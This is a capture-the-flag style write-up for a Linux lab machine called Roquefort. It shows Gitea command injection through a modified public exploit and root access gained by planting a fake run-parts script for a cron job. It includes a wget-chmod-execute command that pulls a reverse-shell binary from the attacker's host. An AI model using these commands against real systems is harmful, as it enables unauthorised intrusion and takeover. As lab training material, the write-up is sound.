# 🧀 Roquefort (Linux)

## 🚪 Ports
```
21/tcp   open  ftp  
22/tcp   open  ssh  
2222/tcp open  EtherNetIP-1  
3000/tcp open  ppp  
```

---

## 🎯 Initial Foothold

- Found Gitea 1.7.5 running on port **3000**.
- Created a user via the Gitea web interface:  
  👤 `yoni : yoniyoni`
- Found [Gitea Exploit 49383.py](https://www.exploit-db.com/exploits/49383) and modified it with:

```python
USERNAME = "yoni"
PASSWORD = "yoniyoni"
HOST_ADDR = '192.168.45.166'
HOST_PORT = 3000
URL = 'http://192.168.116.67:3000'
CMD = 'wget http://192.168.45.166:21/shell.elf; chmod +x shell.elf; ./shell.elf'
```

- Created a reverse shell using `msfvenom` and started a listener on **port 22**.
- After running the exploit, received a shell!

---

## 🧑‍💻 Privilege Escalation

- Ran `linpeas.sh` and found `/usr/local/bin` is writable.
- Used `pspy32` and noticed this recurring cron job:

```bash
run-parts --report /etc/cron.hourly
```

- Created a reverse shell script named `run-parts` and placed it inside `/usr/local/bin`.
- Made it executable with `chmod +x run-parts`.
- Started a `nc` listener.
- 🧨 After 5 minutes — got a root shell!

---

## 💡 Key Takeaways

- 🧠 Local writable folders + cron = escalation.
- 🛠 Gitea versions <1.8 are vulnerable to command injection.
- 🔎 `pspy` and `linpeas` are your best friends for escalation discovery.

